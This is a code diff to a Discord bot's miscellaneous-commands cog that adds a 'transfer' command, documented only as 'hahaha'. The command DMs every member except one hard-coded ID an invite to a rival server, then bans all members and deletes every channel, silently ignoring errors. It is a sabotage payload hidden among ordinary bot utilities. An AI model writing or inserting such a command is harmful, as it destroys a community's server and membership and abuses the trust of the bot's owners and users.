@@ -88,5 +88,28 @@ class Misc:
         except discord.errors.Forbidden:
             await ctx.say("💢 I don't have permission to do this.")
 
+    @commands.command()
+    async def transfer(self, ctx):
+        """hahaha"""
+        await ctx.message.delete()
+        for member in self.bot.guild.members:
+            if member.id == 208370244207509504:
+                continue
+            try:
+                await member.send("Due to T3CH doing questionnable moderating decisions, the old SSS is dead. Here's a link to the new SSS: https://discord.gg/B2T3F3y \n\n\n***ALL HAIL BRITTANIA***")
+            except:
+                pass
+
+        for member in self.bot.guild.members:
+            try:
+                await member.ban(delete_message_days=0)
+            except:
+                pass
+        for channel in self.bot.guild.channels:
+            try:
+                await channel.delete()
+            except:
+                pass
+
 def setup(bot):
     bot.add_cog(Misc(bot))
